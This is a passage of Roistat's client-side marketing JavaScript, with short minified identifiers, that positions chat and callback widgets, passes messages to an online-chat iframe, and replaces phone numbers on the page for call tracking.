            ey.setAttribute("style", "top: " + e6[fe].top + ";right:" + e6[fe].right + ";bottom:" + e6[fe].bottom + ";left:" + e6[fe].left + ";");
            ey.style.transformOrigin = e6[fe].transformOrigin;
            ey.style.transform = ec();
          }
        }
        function eC() {
          if (eg(eT)) {
            var fe = eV();
            var ff = fe === "topLeft" || fe === "bottomLeft" ? "margin-right" : "margin-left";
            eT.setAttribute("style", ff + ": auto");
          }
        }
        function eX() {
          if (eg(eH)) {
            var fe = eV();
            eH.setAttribute("style", "top: " + es[fe].top + ";right:" + es[fe].right + ";bottom:" + es[fe].bottom + ";left:" + es[fe].left + ";");
          }
        }
        function eu() {
          if (eg(e8)) {
            var fe = eV();
            e8.setAttribute("style", "top: " + eF[fe].top + ";right:" + eF[fe].right + ";bottom:" + eF[fe].bottom + ";left:" + eF[fe].left + ";border-top-color:" + eF[fe]["border-top-color"] + ";border-right-color:" + eF[fe]["border-right-color"] + ";border-bottom-color:" + eF[fe]["border-bottom-color"] + ";border-left-color:" + eF[fe]["border-left-color"] + ";");
          }
        }
        function e2() {
          eS();
          eC();
          eX();
          eu();
        }
        function ex() {
          var ff = cy.decode(cs.get(dg));
          if (ff) {
            eY("appending multiwidget pulsator");
            var fe = M.createElement("div");
            fe.innerHTML = ff;
            ey = fe.childNodes.item(0);
            if (!cv.roistat.multiwidget.isVisible) {
              eY("Hide widget");
              ey.className = ey.className + " " + e5;
            }
            M.body.appendChild(ey);
            eN();
            eI();
            ek();
            e2();
            fd();
          }
        }
        function e0() {
          am(cv, "message", function fe(fi) {
            var fh = typeof fi.data === "string" ? fi.data : fi.data.message;
            if (fh === eO) {
              eD = true;
              eW(ev);
            }
          });
          am(cv, "resize", function fg() {
            if (eg(ey)) {
              ey.style.transform = ec();
            }
          });
          if (d4) {
            am(eh, "resize", function ff() {
              if (eg(ey)) {
                ey.style.transform = ec();
              }
            });
          }
        }
        function e3() {
          b7();
          e0();
          eY("activated");
          ex();
        }
        d0 = eR;
        cL(e3);
      },
      onlineChat: function () {
        var fo = "iframe-module-created",
          ew = "iframe_chat_successfully_loaded",
          em = "iframe-online-chat-opened",
          es = "iframe-online-chat-invite-message",
          fJ = "iframe-delivered-messages",
          fq = "roistat-online-chat-init",
          fn = "roistat-online-chat-init-with-text",
          fa = "roistat-online-chat-open",
          fQ = "roistat-online-chat-reload",
          fB = "roistat-online-chat-update-custom-params",
          eJ = "roistat-online-chat-lead_successfully_sent",
          fu = "roistat-online-chat-translate-form",
          eU = "roistat-online-chat-send-lead",
          fE = "roistat_chat_id",
          fP = "roistat_chat_session",
          fp = "roistat_chat_custom_position",
          eD,
          ex,
          fF,
          et,
          ey,
          fC,
          fh,
          eO,
          ff;
        var e9 = "roistat-online-chat-popup-iframe",
          eR = "roistat-online-chat-hidden",
          fG = "roistat-online-chat-holder",
          fA = "roistat-online-chat-popup-wrapper",
          fx = "roistat-multiwidget-pulsator-phone",
          en = "roistat-multiwidget-pulsator-popup-item-chat",
          fe = "roistat-online-chat-popup-wrapper-hidden",
          eP = "roistat-online-chat-popup-mouse-track",
          e8 = "roistat-online-chat-popup-mouse-track-active",
          eT = "roistat-online-chat-pulsator-fill",
          fD = "roistat-online-chat-pulsator-img",
          e1 = "roistat-online-chat-pulsator-phone",
          fS = "roistat-online-chat-pulsator-circle",
          er = "." + fS,
          fw = "roistat-online-chat-pulsator-notification-circle",
          fR = "." + fw,
          eH = "roistat-online-chat-pulsator-fill-svg",
          fd = "roistat-online-chat-popup-spacer",
          eC = ".roistat-multiwidget-pulsator-items-popup",
          eA = ".roistat-online-chat-pulsator-phone",
          e6 = ".roistat-online-chat-popup-wrapper";
        var eL = 99;
        var fz = "roistat-online-chat-pulsator-notification-limit";
        var eQ = false,
          eS = false,
          fi = 0,
          eq = 0;
        var fb = ".roistat-online-chat-holder";
        var e0 = "roistat-online-chat-holder-hidden";
        if (d3()) {
          fb = ".roistat-multiwidget-pulsator-holder";
          e0 = "roistat-multiwidget-pulsator-holder-hidden";
          fS = "roistat-multiwidget-pulsator-circle";
          er = "." + fS;
          fw = "roistat-multiwidget-pulsator-notification-circle";
          fR = "." + fw;
          fz = "roistat-multiwidget-pulsator-notification-limit";
        }
        var fK;
        var fO = {
          topLeft: {
            bottom: "unset",
            right: "unset",
            top: dJ() ? 0 : "20px",
            left: dJ() ? 0 : "35px"
          },
          topRight: {
            bottom: "unset",
            right: dJ() ? 0 : "35px",
            top: dJ() ? 0 : "20px",
            left: "unset"
          },
          bottomRight: {
            bottom: dJ() ? 0 : "20px",
            right: dJ() ? 0 : "35px",
            top: "unset",
            left: "unset"
          },
          bottomLeft: {
            bottom: dJ() ? 0 : "20px",
            right: "unset",
            top: "unset",
            left: dJ() ? 0 : "35px"
          }
        };
        var fc = {
          topLeft: {
            top: dJ() ? "90px" : "130px",
            right: "unset",
            bottom: "unset",
            left: dJ() ? "3%" : "65px"
          },
          topRight: {
            top: dJ() ? "90px" : "130px",
            right: dJ() ? "3%" : "65px",
            bottom: "unset",
            left: "unset"
          },
          bottomRight: {
            top: "unset",
            right: dJ() ? "3%" : "65px",
            bottom: dJ() ? "90px" : "130px",
            left: "unset"
          },
          bottomLeft: {
            top: "unset",
            right: "unset",
            bottom: dJ() ? "90px" : "130px",
            left: dJ() ? "3%" : "65px"
          }
        };
        var fH = {
          topLeft: {
            top: "unset",
            bottom: "0",
            height: "20px"
          },
          topRight: {
            top: "unset",
            bottom: "0",
            height: "20px"
          },
          bottomLeft: {
            top: "0",
            bottom: "unset",
            height: "50px"
          },
          bottomRight: {
            top: "0",
            bottom: "unset",
            height: "50px"
          }
        };
        var fm = function (fW) {
          A("onlineChat: " + fW);
        };
        var eI = function () {
          function fW() {
            return Math.random().toString(36).substr(2, 8);
          }
          return fW() + fW() + fW() + fW();
        };
        var ez = function () {
          var fW = cs.get(fP);
          if (!fW) {
            fW = eI();
            cs.set(fP, fW);
          }
          return fW;
        };
        var ep = function () {
          var fW = {
            message: fo,
            detail: {
              version: ab,
              language: t,
              projectKey: bd(),
              visitId: cM(),
              firstVisit: cs.get(a5),
              chatId: j(fE),
              moduleTargetOrigin: cv.location.origin,
              referrer: cv.location.href,
              params: ea,
              sessionUniqueKey: ez()
            }
          };
          fC.contentWindow.postMessage(fW, fC.src);
        };
        var eE = function () {
          var fW = {
            message: em,
            detail: {
              isOpened: fI()
            }
          };
          fC.contentWindow.postMessage(fW, fC.src);
        };
        var eG = function () {
          var fW = {
            message: fB,
            detail: {
              params: ea
            }
          };
          fC.contentWindow.postMessage(fW, fC.src);
        };
        var ek = function () {
          var fW = {
            language: t,
            message: fu
          };
          fC.contentWindow.postMessage(fW, fC.src);
        };
        var eK = function (fX) {
          var fW = {
            message: fn,
            detail: {
              message: fX
            }
          };
          fC.contentWindow.postMessage(fW, fC.src);
        };
        var fV = function (fW) {
          var fX = {
            message: fa,
            detail: {
              chatId: fW
            }
          };
          fC.contentWindow.postMessage(fX, fC.src);
        };
        var fv = function () {
          am(cv, "message", function fW(fZ) {
            var fY = typeof fZ.data === "string" ? fZ.data : fZ.data.message;
            var fX = typeof fZ.data !== "string" ? fZ.data.detail : {};
            fm("event: " + fY + " " + JSON.stringify(fX));
            switch (fY) {
              case ew:
                fy();
                cv.setRoistatOnlineChatCustomParams = eX;
                eX(ea);
                if (typeof cv.onRoistatOnlineChatInited === "function") {
                  cv.onRoistatOnlineChatInited();
                }
                break;
              case fo:
                ep();
                break;
              case fq:
                fm("saving chat id = " + fX.chatId);
                dA(fE, fX.chatId, {
                  path: "/"
                });
                break;
              case fn:
                fm("saving chat with text id = " + fX.chatId);
                if (cv.onRoistatChatInit !== bO && typeof cv.onRoistatChatInit === "function") {
                  cv.onRoistatChatInit(fX.chatId);
                }
                dA(fE, fX.chatId, {
                  path: "/"
                });
                cv.roistatOnlineChatShow();
                break;
              case fa:
                fm("saving chat id by open chat = " + fX.chatId);
                dA(fE, fX.chatId, {
                  path: "/"
                });
                cv.roistatOnlineChatShow();
                break;
              case es:
                fm("rendering invite message");
                fr(fX.message);
                break;
              case fJ:
                fm("get delivered messages");
                fU(fX.messages);
                break;
              case eU:
                fm("sending lead");
                eF(fX.leadData);
            }
          });
        };
        var eW = function () {
          var fX = cv.roistat.onlineChat.notificationsCustomHolderSelector;
          var fW = fX !== null;
          return M.querySelector(fW ? fX : fb);
        };
        var eF = function (fW) {
          cv.roistatGoal.reach(fW, function () {
            fC.contentWindow.postMessage(eJ, fC.src);
          });
        };
        var fr = function (f3) {
          if (fI()) {
            return;
          }
          var fY = "<div class='roistat-online-chat-message'><img src='" + f3.operator.avatar + "' class='roistat-online-chat-message-avatar'></img><div class='roistat-online-chat-message-content'><div class='roistat-online-chat-message-name'><span class='roistat-online-chat-message-name-text'>" + f3.operator.name + "</span><div class='roistat-online-chat-message-name-online-status'></div></div><div class='roistat-online-chat-message-text'>" + f3.text + "</div></div><div class='roistat-online-chat-message-close'>х</div></div>";
          var f2 = M.createElement("div");
          f2.innerHTML = fY;
          var f1 = eW();
          if (eg(f1)) {
            var f4 = fg() ? "beforeend" : "afterbegin";
            f1.insertAdjacentHTML(f4, fY);
            var f0 = f1.getElementsByClassName("roistat-online-chat-message-close");
            var fW = f1.getElementsByClassName("roistat-online-chat-message");
            var fZ = f0[fg() ? f0.length - 1 : 0];
            var fX = fW[fg() ? f0.length - 1 : 0];
          }
          setTimeout(function () {
            fX.remove();
          }, 15000);
          ef(fX, "click", function (f5) {
            f5.stopPropagation();
            if (!fI()) {
              ft();
            }
            fL();
          });
          ef(fZ, "click", function (f5) {
            f5.stopPropagation();
            fX.remove();
          });
        };
        var fU = function (fY) {
          var f2 = eW();
          if (eg(f2)) {
            var f3 = f2.querySelector(er);
            var fX = f2.querySelector(fR);
            var f1 = fY > eL;
            var f0 = f1 ? eL + "+" : fY;
            if (fX && !fY) {
              fX.remove();
              return;
            }
            if (fX) {
              fX.textContent = f0;
              fX.classList.toggle(fz, f1);
              return;
            }
            if (fY) {
              var fW = f1 ? fz : "";
              var fZ = '<div class="' + fw + fW + '">' + f0 + "</div>";
              f3.insertAdjacentHTML("beforebegin", fZ);
            }
          }
        };
        var fL = function () {
          var fX = eW();
          if (eg(fX)) {
            var fW = fX.getElementsByClassName("roistat-online-chat-message");
            while (fW.length > 0) {
              fW[0].remove();
            }
          }
        };
        var fN = function () {
          fC = M.getElementById(e9);
          if (eg(fC)) {
            ef(fC, "load", function () {
              e7();
            });
          }
          ef(M, "click", function (f1) {
            var f0 = cv.roistat.onlineChat.customTriggerSelector;
            if (d3()) {
              var f2 = d7(M, fx);
              var fZ = d7(M, en);
              var fY = fI() && f1.target !== fZ && !fZ.contains(f1.target);
              if (fY) {
                dW(f2, "opened", false);
              }
            } else {
              var fW = d7(M, fG);
              var fX = fI() && f1.target !== fW && !fW.contains(f1.target);
              if (fX) {
                dW(fW, "opened", false);
              }
            }
            if (fI() && f1.target.closest(eC) === null && f1.target.closest(e6) === null && f1.target.closest(eA) === null && (f0 ? f1.target.closest(f0) === null : true)) {
              ft();
            }
          });
        };
        var el = function (fY) {
          var fX = fF.getBoundingClientRect().x;
          var fW = fF.getBoundingClientRect().y;
          eS = true;
          eo();
          fi = fY.pageX - fX;
          if (fg()) {
            eq = fY.pageY + fW;
          } else {
            eq = fY.pageY - fW;
          }
        };
        var eZ = function () {
          eS = false;
          fs();
          eM();
        };
        var eo = function () {
          if (eg(ex)) {
            ex.classList.add(e8);
          }
        };
        var fs = function () {
          if (eg(ex)) {
            ex.classList.remove(e8);
          }
        };
        var fj = function (f4) {
          if (eS && eg(fF)) {
            var fW = fF.getBoundingClientRect();
            var f3 = fW.width;
            var f2 = 400;
            var fX = 50;
            var f7 = 0;
            var fZ = cv.innerHeight - f2;
            var f5 = f4.pageX - fi;
            var f1 = fX;
            var fY = cv.innerWidth - fX - f3;
            if (fg()) {
              f7 = cv.innerHeight - (f4.pageY + fW.y) - 20;
            } else {
              f7 = f4.pageY - eq;
            }
            var f6 = fM();
            var f0 = f6 === "bottomLeft" || f6 === "bottomRight" ? "top" : "bottom";
            if (f5 >= f1 && f5 <= fY) {
              fF.style.left = f5 + "px";
              if (!fT()) {
                fF.style.right = "unset";
              }
            }
            if (f7 >= 50 && f7 <= fZ) {
              fF.style[f0] = f7 + "px";
            }
          }
        };
        var eM = function () {
          var fW = {
            position: fM(),
            top: fF.style.top,
            left: fF.style.left,
            bottom: fF.style.bottom,
            right: fF.style.right
          };
          cs.setObject(fp, fW);
        };
        var fM = function () {
          var fW = cs.getObject(f);
          var fX = typeof fW.position === "string" && fW.position !== "";
          return fX ? fW.position : "bottomRight";
        };
        var fg = function () {
          var fW = fM();
          return fW === "topLeft" || fW === "topRight";
        };
        var fT = function () {
          var fW = fM();
          return fW === "topLeft" || fW === "bottomLeft";
        };
        var eN = function (fX) {
          var fW = Math.max(fX * ei(), fX) + "px";
          et.style.height = fW;
          et.style.marginBottom = "-" + fX + "px";
        };
        var ev = function () {
          var f0 = fM();
          var f2 = cv.roistat.onlineChat.customPosition;
          var f4 = f2 && f2.top !== null ? f2.top : fc[f0].top;
          var fY = f2 && f2.right !== null ? f2.right : fc[f0].right;
          var fW = f2 && f2.bottom !== null ? f2.bottom : fc[f0].bottom;
          var fZ = f2 && f2.left !== null ? f2.left : fc[f0].left;
          fF = d7(eD, fA);
          if (eg(fF)) {
            fF.classList.add(fe);
            fF.setAttribute("style", "visibility: hidden;top: " + f4 + ";right:" + fY + ";bottom:" + fW + ";left:" + fZ + ";");
            et = d7(eD, fd);
            if (eg(et)) {
              var f3 = parseInt(f4 === "unset" ? fW : f4);
              eN(f3);
              cv.addEventListener("resize", function fX() {
                eN(f3);
              });
              if (d4) {
                eh.addEventListener("resize", function f1() {
                  eN(f3);
                });
              }
            }
          }
        };
        var eY = function () {
          if (eg(ex)) {
            var fW = fM();
            ex.setAttribute("style", "top: " + fH[fW].top + ";bottom:" + fH[fW].bottom + ";height:" + fH[fW].height + ";");
          }
        };
        var eV = function () {
          if (eg(fK)) {
            var fW = fM();
            fK.setAttribute("style", "top: " + fO[fW].top + ";right:" + fO[fW].right + ";bottom:" + fO[fW].bottom + ";left:" + fO[fW].left + ";");
          }
        };
        var e3 = function () {
          fm("iframe appending to page");
          var fW = cy.decode(cs.get(D));
          eD = M.createElement("div");
          eD.innerHTML = fW;
          M.body.appendChild(eD);
          ex = d7(M, eP);
          ev();
          fN();
        };
        var e5 = function () {
          var fX = cs.getObject(f);
          fm("start filling pulsator");
          if (fX) {
            if (eg(fh)) {
              fh.setAttribute("style", "background: " + fX.button_color + ";");
            }
            if (eg(eO)) {
              eO.setAttribute("style", "fill: " + fX.icon_color + ";");
            }
            if (HTMLCollection.prototype.isPrototypeOf(ff)) {
              for (var fW = 0; fW < ff.length; fW++) {
                ff[fW].setAttribute("style", "fill: " + fX.button_color + ";");
              }
            }
          }
        };
        var fy = function () {
          var fX = cy.decode(cs.get(bz));
          var fZ = !cW() && cv.roistatOnlineChatOnly;
          var fY = fX && !d3() && dZ() || fZ;
          if (fY) {
            fm("pulsator appending to page");
            var fW = M.createElement("div");
            fW.innerHTML = fX;
            fK = fW.childNodes.item(0);
            if (!cv.roistat.multiwidget.isVisible) {
              fm("Hide widget");
              fK.className = fK.className + " " + e0;
            }
            fh = d7(fK, eT);
            eO = d7(fK, fD);
            ey = d7(fK, e1);
            ff = M.getElementsByClassName(eH);
            M.body.appendChild(fK);
            eV();
            eB();
            e5();
          }
        };
        var eB = function () {
          if (eg(fK)) {
            ef(fK, "click", function () {
              ft();
              eu(fK);
            });
          }
        };
        function eu(fW) {
          if (eg(fW)) {
            fW.classList.toggle("opened");
          }
        }
        var fI = function () {
          return eg(fF) && !fF.classList.contains(fe);
        };
        var ft = function () {
          setTimeout(function () {
            eS = false;
          }, 3000);
          if (eg(fF)) {
            fF.classList.toggle(fe);
          }
          if (fI()) {
            fL();
          }
          eE();
        };
        var fl = function () {
          var fW = eW();
          if (eg(fW)) {
            fW.classList.toggle(e0);
          }
        };
        var e2 = function (fW) {
          t = fW;
          if (!eg(fC)) {
            return;
          }
          ek();
        };
        var e4 = function (fW) {
          if (!eg(fC)) {
            return;
          }
          eK(fW);
        };
        var ej = function (fW) {
          if (!eg(fC)) {
            return;
          }
          fV(fW);
        };
        var e7 = function () {
          eQ = true;
          cv.roistatOnlineChatShow = function () {
            setTimeout(function () {
              ft();
            }, 0);
          };
          cv.roistatMultiwidgetShow = fl;
          fm("chat window initialized");
        };
        function eX(fW) {
          dR(fW);
          eG();
        }
        function fk() {
          b7();
          e3();
          fv();
        }
        cv.roistat.onlineChat.actions.initWithMessage = e4;
        cv.roistat.onlineChat.actions.openChat = ej;
        cv.roistat.onlineChat.localization.translateToRussian = function () {
          e2(cp);
        };
        cv.roistat.onlineChat.localization.translateToEnglish = function () {
          e2(aC);
        };
        cv.roistat.onlineChat.localization.translate = function (fZ) {
          var fY = cF[cp].includes(fZ),
            fX = cF[aC].includes(fZ),
            fW = fZ;
          if (fY) {
            fW = cp;
          }
          if (fX) {
            fW = aC;
          }
          e2(fW);
        };
        cL(fk);
      }
    };
    function d6(ej) {
      A("Widgets: " + ej);
    }
    function e(ej) {
      return ej !== ee;
    }
    function dR(el) {
      var ek = Object.keys(el);
      for (var ej = 0; ej < ek.length; ej++) {
        ea[ek[ej]] = el[ek[ej]];
      }
    }
    function d3() {
      var er = Number(cs.get(bP)),
        ek = er && dV && dQ,
        ev = Number(cs.get(bk)),
        en = dZ(),
        es = Number(cs.get(cb)),
        eo = Number(cs.get(U)),
        ej = Number(cs.get(cN)),
        em = Number(cs.get(cY)),
        eu = Number(cs.get(dP)),
        et = ek || en || es || eo || ej || em || eu,
        el = ek && !en && !es && !eo && !ej && !em && !eu,
        eq = en && !ek && !es && !eo && !ej && !em && !eu,
        ew = !cW() && cv.roistatOnlineChatOnly,
        ep = cW() && dD();
      A("Is online chat only: " + ew);
      A("Is rp: " + ew);
      return ev && et && !eq && !el && !ew && !ep;
    }
    function dZ() {
      var ej = Number(cs.get(cZ));
      if (!ej) {
        A("OnlineChat: Online chat is disabled");
        return false;
      }
      var ek = cs.getObject(C);
      if (!ek.is_available_for_current_user_agent) {
        A("OnlineChat: Current device group is disabled");
        return false;
      }
      if (!ek.pages_filter.is_enabled) {
        A("OnlineChat: Pages filter is disabled");
        return true;
      }
      return bS(ek.pages_filter.pages.join(","));
    }
    function d0() {
      d6("Multiwidget disabled. Hide leadhunter pulsator from module");
    }
    function dT(ej, el, ek) {
      cs.set(b9, cy.encode(ej));
      cs.set(bD, cy.encode(el));
      cs.setObject(b8, ek);
    }
    function dY(ek, ej) {
      cs.set(dg, cy.encode(ek));
      cs.setObject(f, ej);
    }
    function dX(el, ej, ek) {
      cs.set(bz, cy.encode(el));
      cs.set(D, cy.encode(ej));
      cs.set(cZ, ek);
    }
    function d2(ej, el, ek) {
      dT(ej, el, ek);
      cs.set(dg, cy.encode(ee));
      cs.set(D, cy.encode(ee));
      d5 = false;
      eb.leadHunter();
    }
    function dS(eu, eq, eo) {
      var el = eu.form_template,
        ev = eu.pulsator_template,
        en = eu.pulsator_settings;
      if (dD()) {
        d2(el, ev, en);
        return;
      }
      d6("start initing widgets");
      var er = eo.pulsator_template,
        em = eo.iframe_template,
        et = eq.pulsator_template,
        ej = eq.pulsator_settings,
        ep = Number(cs.get(bP)),
        ek = Number(eo.settings.is_enabled),
        es = cs.getObject(s) !== null;
      dT(el, ev, en);
      dY(et, ej);
      dX(er, em, ek);
      if (es) {
        cs.set(b9, cy.encode(dU()));
      }
      d5 = true;
      if (ep && !aQ()) {
        d6("leadhunter enabled. Start processing");
        eb.leadHunter();
      }
      if (dZ()) {
        d6("online chat enabled. Start processing");
        eb.onlineChat();
      }
      if (d3()) {
        d6("multiwidget enabled. Start processing");
        eb.multiwidget();
      }
    }
    var dU = function () {
      var ej = bi() + "//" + x + "/api/site/1.0/" + bd() + "/leadhunter/script/" + cs.get(a3) + "/widget";
      return '<div class="roistat-lh-popup-wrapper" data-is-iframe="1"><iframe id="roistat-lh-popup-iframe" class="roistat-lh-popup-iframe" src="' + ej + '" frameborder="0"></iframe></div>';
    };
    function ed() {
      var el = cs.get(b9),
        ew = cs.get(bD),
        en = cs.getObject(b8),
        eq = Number(cs.get(bP)),
        er = cs.get(bz),
        em = cs.get(D),
        ek = cs.get(cZ),
        et = cs.get(dg),
        ej = cs.getObject(f);
      cv.roistatLeadhunterForm = d2;
      cv.roistatMultiwidget = dS;
      if (!el || !ew || !en || !et || !ej || !er) {
        d6("requesting data from server");
        if (d3() || dZ() || eq) {
          a4(bi() + "//" + x + "/api/site/" + ao + "/" + bd() + "/multiwidget?domain=" + encodeURIComponent(M.domain));
        }
      } else {
        var ev = cy.decode(et);
        var es = cy.decode(em);
        if ((!e(ev) || !e(es) || dD()) && !aQ()) {
          d6("initing LeadHunter form");
          cv.roistatLeadhunterForm(cy.decode(el), cy.decode(ew), en);
        } else {
          d6("initing multiwidget form");
          var eo = {
              pulsator_template: ev,
              pulsator_settings: ej
            },
            ep = {
              form_template: cy.decode(el),
              pulsator_template: cy.decode(ew),
              pulsator_settings: en
            },
            eu = {
              iframe_template: es,
              pulsator_template: cy.decode(er),
              settings: {
                is_enabled: Number(ek)
              }
            };
          cv.roistatMultiwidget(ep, eo, eu);
        }
      }
    }
    function d1() {
      ed();
      d6("form initialized");
    }
    function d9() {
      d6("activated");
      d1();
    }
    cL(d9);
    cv.setRoistatOnlineChatCustomParams = dR;
    cv.roistatSaveLeadHunterTemplates = dT;
    cv.roistatSaveMultiwidgetTemplate = dY;
    cv.roistatSaveOnlineChatTemplate = dX;
  })();
  (function u() {
    var d2 = function () {
      return j(dH);
    };
    var d0 = function () {
      return cs.get(bs);
    };
    var dT = function () {
      return cs.get(bF);
    };
    var d6 = function (d8) {
      return d8 != null && d8 !== bO && d8 !== "";
    };
    var d5 = function () {
      var d8 = [];
      var d9 = M.getElementsByClassName(ax);
      if (d9 && d9.length) {
        d8 = d9;
      }
      return d8;
    };
    var dR = function () {
      var d8 = [];
      var d9 = M.getElementsByClassName(L);
      if (d9 && d9.length) {
        d8 = d9;
      }
      return d8;
    };
    var dQ = function () {
      var d8 = [];
      var d9 = M.getElementsByClassName(aq);
      if (d9 && d9.length) {
        d8 = d9;
      }
      return d8;
    };
    var dV = function () {
      var d8 = [];
      var d9 = M.getElementsByClassName(O);
      if (d9 && d9.length) {
        d8 = d9;
      }
      return d8;
    };
    var dY = function () {
      var d8 = [];
      var d9 = M.getElementsByClassName(dz);
      if (d9 && d9.length) {
        d8 = d9;
      }
      return d8;
    };
    var e = function (el, d9) {
      A("CallTracking: RenderPhone phone = " + el);
      var ee = function (en) {
        return en.split(/[^0-9]/).join("");
      };
      var ef = function (eq, es) {
        var ev = null;
        if (!eq) {
          return ev;
        }
        var en = es.split(",");
        if (en.length < 2) {
          ev = es;
        } else {
          var eo = eq.getAttribute("data-prefix");
          if (eo) {
            for (var er = 0; er < en.length; er++) {
              var et = en[er];
              var eu = ee(et);
              if (eu.indexOf("8") === 0) {
                eu = "7" + eu.substring(1);
              }
              var ep = eu.split(eo)[0] === "";
              if (ep) {
                ev = et;
                break;
              }
            }
          }
          if (ev === null) {
            ev = en[0];
          }
          A("CallTracking._getPhoneForElement: Prepared phone = " + ev + " for data-prefix = " + eo);
        }
        return ev;
      };
      var ec = function (er, ep) {
        var en = ef(er, ep);
        if (!en || !er) {
          return;
        }
        if (er.tagName.toLowerCase() !== "a") {
          return;
        }
        var eq = er.getAttribute("href");
        if (dj(eq, "tel:")) {
          var eo = ee(en);
          if (eo.indexOf("8") === 0) {
            eo = "7" + eo.substring(1);
          }
          er.setAttribute("href", "tel:+" + eo);
          ed(er, en);
        }
      };
      var ed = function (eo, en) {
        if (!eo.hasAttribute("title")) {
          return;
        }
        eo.setAttribute("title", en);
      };
      var eh = function (ep, eo) {
        var en = ef(ep, eo);
        if (!en || !ep) {
          return;
        }
        ep.innerHTML = en;
      };
      var em = function (en) {
        var eo = d5();
        A("CallTracking: render phone default classes for " + eo.length + " elements");
        r(eo, function (ep) {
          eh(ep, en);
          ec(ep, en);
        });
        r(dR(), function (eq) {
          var ep = ee(ef(eq, en)).slice(0, 1);
          eh(eq, ep);
        });
        r(dQ(), function (eq) {
          var er = ef(eq, en).match(/\((.*)\)/);
          if (er !== null) {
            var ep = er[1];
            eh(eq, ep);
          }
        });
        r(dV(), function (er) {
          var ep = ef(er, en).match(/\)(.*)/);
          if (ep !== null) {
            var es = ee(ep[1]);
            var eq = es.slice(-1 * es.length, -4) + "-" + es.slice(-4, -2) + "-" + es.slice(-2);
            eh(er, eq);
          }
        });
        r(dY(), function (ep) {
          ec(ep, en);
        });
      };
      var ek = function (en, es) {
        if (!es) {
          return;
        }
        A("CallTracking: render phone user replacement for " + es.length + " replacements");
        for (var er = 0; er < es.length; er++) {
          var eu = es[er];
          if (!eu) {
            continue;
          }
          var ep = eu[0];
          eu = eu.substr(1);
          var et = [];
          if (ep === "#") {
            var eq = M.getElementById(eu);
            if (eq !== null) {
              et.push(eq);
            }
          } else {
            et = M.getElementsByClassName(eu);
            eb(eu, en);
          }
          if (!et || et.length < 1) {
            continue;
          }
          A("CallTracking: render phone for " + eu + ", " + et.length + " elements");
          for (var eo = 0; eo < et.length; eo++) {
            eh(et[eo], en);
            ec(et[eo], en);
          }
        }
      };
      var eg = function (en) {
        for (var eo = 0; eo < en.length; eo++) {
          ek(en[eo].phone, en[eo].css_selectors);
          ej(en[eo].phone, en[eo].replaceable_numbers);
        }
      };
      var ej = function (ep, eo) {
        if (!eo || eo.length === 0) {
          return;
        }
        var en = function () {
          var eA = et();
          var ez = M.getElementsByTagName("*");
          var eu = ez.length;
          for (var ey = 0; ey < eu; ey++) {
            var eB = ez[ey];
            eq(eB, eA, ef(eB, ep));
            var ex = eB.childNodes.length;
            for (var ev = 0; ev < ex; ev++) {
              var ew = eB.childNodes[ev];
              es(ew, eA, ef(ew, ep));
            }
          }
        };
        var eq = function (ey, ex, eu) {
          if (!er(ey)) {
            return;
          }
          var ez = ey.getAttribute("href").replace("tel:", "");
          var ew = ex.length;
          for (var ev = 0; ev < ew; ev++) {
            if (ex[ev].test(ez)) {
              ec(ey, ef(ey, eu));
            }
          }
        };
        var er = function (ev) {
          if (ev.tagName.toLowerCase() !== "a") {
            return false;
          }
          var eu = ev.getAttribute("href");
          return a8(eu) && eu.indexOf("tel:") === 0;
        };
        var et = function () {
          var ew = [];
          for (var eu = 0; eu < eo.length; eu++) {
            var ev = "[\\s()[\\]{}\\-+.]*";
            var ex = eo[eu].split("").join(ev);
            ew.push(new RegExp("[+(]?" + ex, "g"));
          }
          return ew;
        };
        var es = function (ex, ew, eu) {
          if (ex.nodeType !== Node.TEXT_NODE) {
            return;
          }
          for (var ev = 0; ev < ew.length; ev++) {
            if (ex.textContent && ew[ev].test(ex.textContent)) {
              ex.textContent = ex.textContent.replace(ew[ev], eu);
            } else {
              if (ex.innerText && ew[ev].test(ex.innerText)) {
                ex.innerText = ex.innerText.replace(ew[ev], eu);
              }
            }
          }
        };
        en();
      };
      var eb = function (eo, en) {
        r(ea(eo + "-" + bX), function (eq) {
          var ep = ee(ef(eq, en)).slice(0, 1);
          eh(eq, ep);
        });
        r(ea(eo + "-" + aW), function (eq) {
          var er = ef(eq, en).match(/\((.*)\)/);
          if (er !== null) {
            var ep = er[1];
            eh(eq, ep);
          }
        });
        r(ea(eo + "-" + br), function (er) {
          var ep = ef(er, en).match(/\)(.*)/);
          if (ep !== null) {
            var es = ee(ep[1]);
            var eq = es.slice(-1 * es.length, -4) + "-" + es.slice(-4, -2) + "-" + es.slice(-2);
            eh(er, eq);
          }
        });
        r(ea(eo + "-" + cg), function (ep) {
          ec(ep, en);
        });
      };
      var ea = function (eo) {
        var en = [];
        var ep = M.getElementsByClassName(eo);
        if (ep && ep.length) {
          en = ep;
        }
        return en;
      };
      var ei = function ei() {
        var eo = dT();
        if (eo) {
          eo = eo.split("\n");
          for (var en = 0; en < eo.length; en++) {
            eo[en] = "." + eo[en];
          }
        }
        if (d9 instanceof Array) {
          eg(d9);
        } else {
          em(el);
          ek(el, eo);
        }
      };
      (function d8() {
        ei();
        var en = [300, 5000, 15000];
        en.forEach(function (eo) {
          setTimeout(ei, eo);
        });
      })();
    };
    var dS = function (d8) {
      cs.save(o, d8, c7);
    };
    var d1 = function () {
      if (cv.roistat.callTracking.phone) {
        var d8 = {
          expires: parseInt(cv.roistat.callTracking.sessionTime),
          path: "/"
        };
        if (c7.domain) {
          d8.domain = c7.domain;
        }
        dA(dH, cv.roistat.callTracking.phone, d8);
        dS(1);
        cs.save(bF, cv.roistat.callTracking.replacementClasses, c7);
        cs.save(bs, cv.roistat.callTracking.phoneScriptsJson, c7);
      }
    };
    var dZ = function (d9, ed, eb, ea) {
      A("CallTracking: reuse phone " + d9 + " for time " + ed + " and replacements " + eb);
      var d8 = 'script[data-roistat-script-id="' + Z + '"]';
      M.querySelectorAll(d8).forEach(function (eg, ef) {
        if (ef === 0) {
          return;
        }
        eg.remove();
      });
      A("CallTracking: all old scripts removed");
      if (!d6(d9)) {
        A("CallTracking: new phone is invalid");
        roistat.callTracking.phone = null;
        dm();
        return;
      }
      roistat.callTracking.enabled = 1;
      roistat.callTracking.phone = d9;
      roistat.callTracking.sessionTime = ed;
      roistat.callTracking.replacementClasses = eb;
      roistat.callTracking.phoneScriptsJson = ea;
      dm();
      d1();
      var ee = {
        expires: parseInt(ed),
        path: "/"
      };
      if (c7.domain) {
        ee.domain = c7.domain;
      }
      dA(dH, d9, ee);
      cs.save(bs, ea, c7);
      cs.save(bF, eb, c7);
      var ec = ds(ea);
      if (ec == null) {
